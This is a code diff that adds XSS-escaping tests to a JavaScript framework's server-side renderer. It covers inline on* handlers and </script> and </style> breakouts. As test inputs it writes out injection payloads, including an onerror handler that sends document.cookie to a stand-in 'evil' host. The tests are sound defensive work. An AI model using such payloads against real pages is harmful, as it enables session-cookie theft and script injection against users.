@@ -8,7 +8,7 @@
 // No mocks: the real reactivity core (signals, memos, render-mode stack), the real renderer
 // (h, control-flow), and the real string emitter run end to end.
 import { describe, it, expect } from 'vitest';
-import { renderToString, renderToStaticMarkup, h, Show, For, Switch, Match, Dynamic, createSignal, createMemo, createContext, provideContext, useContext } from 'azerothjs';
+import { renderToString, renderToStaticMarkup, h, Show, For, Switch, Match, Dynamic, createSignal, createMemo, createContext, provideContext, useContext, unsafeTag } from 'azerothjs';
 
 describe('renderToString - the no-DOM contract', () =>
 {
@@ -405,6 +405,45 @@ describe('renderToString - escaping / XSS', () =>
         const [markup] = createSignal('<b>trusted</b>');
         expect(renderToString(() => h('div', { innerHTML: () => markup() })))
             .toBe('<div><b>trusted</b></div>');
+    });
+
+    it('throws on a string-valued on* prop instead of emitting a live inline handler', () =>
+    {
+        // The DOM path throws the same error, so client and server agree.
+        expect(() => renderToString(() =>
+            h('img', { src: 'x', onerror: 'fetch(\'https://evil/?c=\'+document.cookie)' })))
+            .toThrow(/on\* prop must be a function/);
+    });
+
+    it('neutralizes a </script> breakout in script children (JSON-LD injection)', () =>
+    {
+        const product = { name: '</script><img src=x onerror=alert(1)>' };
+        const html = renderToString(() =>
+            h('script', { type: 'application/ld+json' }, JSON.stringify(product)));
+        // The child can never terminate the element: no raw </script> survives, and the
+        // injected <img> stays inside the script body as escaped text.
+        expect(html).not.toContain('</script><img');
+        expect(html.match(/<\/script>/g)).toHaveLength(1);
+        expect(html.endsWith('</script>')).toBe(true);
+        expect(html).toContain('\\u003c/script>');
+    });
+
+    it('neutralizes a </style> breakout in style children', () =>
+    {
+        const html = renderToString(() => h('style', {}, '.a::after { content: "</style><script>alert(1)</script>"; }'));
+        expect(html).not.toContain('</style><script>');
+        expect(html.match(/<\/style>/g)).toHaveLength(1);
+        expect(html.endsWith('</style>')).toBe(true);
+    });
+
+    it('keeps legitimate script/style content lossless (only breakout sequences change)', () =>
+    {
+        // A `<` that does not open a terminating sequence is untouched. An EXECUTING script is
+        // refused by the tag gate, so this one is spelled with the opt-out the gate documents.
+        expect(renderToString(() => h(unsafeTag('script'), {}, 'if (a < b && c > d) run();')))
+            .toBe('<script>if (a < b && c > d) run();</script>');
+        expect(renderToString(() => h('style', {}, '.a{color:red}')))
+            .toBe('<style>.a{color:red}</style>');
     });
 });
 
